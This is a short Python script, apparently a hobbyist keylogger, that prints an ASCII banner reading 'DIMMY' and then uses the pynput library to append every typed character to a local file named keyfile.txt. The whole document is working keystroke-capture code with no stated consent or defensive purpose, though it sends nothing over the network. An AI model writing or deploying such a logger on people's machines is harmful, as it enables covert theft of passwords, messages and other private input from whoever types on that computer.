from pynput import keyboard

print("""
DDDDD   IIIIII  MMM   MMM  MMM   MMM  Y     Y
D    D    I     M  M M  M  M  M M  M   Y   Y 
D     D   I     M   M   M  M   M   M    Y Y  
D     D   I     M       M  M       M     Y   
D     D   I     M       M  M       M     Y   
D    D    I     M       M  M       M     Y   
DDDDD   IIIIII  M       M  M       M     Y   
""")

def keyPressed(key):
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()